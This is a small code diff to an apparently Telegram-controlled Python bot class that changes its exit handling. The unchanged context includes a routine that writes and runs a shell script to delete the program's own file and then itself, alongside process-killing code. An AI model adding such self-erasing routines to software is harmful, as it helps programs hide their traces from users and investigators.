@@ -1574,6 +1574,7 @@ class PeppinoTelegram:
 
         def stop(self) -> None:
             self.bsend("🛑 Interrupted by you, bye bye.")
+            sys.exit()
 
         def terminate_process_by_name(self, process_name: str) -> None:
             for proc in psutil.process_iter():
@@ -1601,7 +1602,7 @@ class PeppinoTelegram:
                     f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
                 chmod(sh_file, 0o700)
                 Popen(['sh', sh_file]) 
-            sys.exit(1)
+            self.stop()
 
         def waitforface(self, timeout=60):
             start = time()
